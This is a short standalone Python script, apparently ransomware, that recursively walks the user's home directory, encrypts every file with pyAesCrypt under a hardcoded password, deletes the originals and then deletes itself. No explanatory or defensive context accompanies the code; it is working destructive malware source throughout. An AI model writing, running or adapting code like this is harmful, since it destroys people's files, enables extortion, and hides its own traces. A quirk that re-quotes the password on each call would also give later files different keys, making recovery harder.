import os
import sys
import pyAesCrypt
import getpass as gt

user = gt.getuser()
direct = f'/home/{user}'
password = "bananaboat"

def crypt(file):
    global password
    print('-' * 80)
    password = "'"+str(password)+"'"
    buffer_size = 512*1024
    pyAesCrypt.encryptFile(str(file), str(file) + ".crp", password, buffer_size)
    print("[Encrypt] '"+str(file)+".crp'")
    os.remove(file)

def walk(dir):
    try:
        for name in os.listdir(dir):
            path = os.path.join(dir, name)
            if os.path.isfile(path):
                crypt(path)
            else:
                walk(path)
    except:
        pass

walk(direct)
print('-' * 80)
os.remove(str(sys.argv[0]))